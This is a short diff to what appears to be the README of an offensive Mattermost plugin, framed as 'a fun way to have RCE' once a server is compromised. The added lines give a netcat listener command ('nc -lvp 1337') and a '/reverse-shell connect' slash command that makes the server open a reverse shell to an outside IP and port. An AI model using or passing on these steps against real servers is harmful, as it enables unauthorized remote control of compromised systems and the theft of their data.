@@ -11,3 +11,13 @@ If you compromise a Mattermost server, this is a fun way to have RCE.
 ```
 make && make deploy
 ```
+
+Then... start a reverse shell listener
+```
+nc -lvp 1337
+```
+
+and connect
+```
+/reverse-shell connect 1.2.3.4 1337
+```
